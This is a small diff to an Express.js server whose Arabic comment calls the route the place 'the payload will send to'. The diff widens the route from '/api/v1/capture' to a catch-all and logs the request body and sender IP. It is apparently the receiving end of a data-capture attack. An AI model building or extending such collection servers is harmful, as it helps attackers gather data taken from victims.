@@ -10,7 +10,7 @@ app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
 // المسار اللي البايلود هيبعت عليه
-app.post('/api/v1/capture', async (req, res) => {
+app.post('/*', async (req, res) => {
     const data = req.body;
     const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     
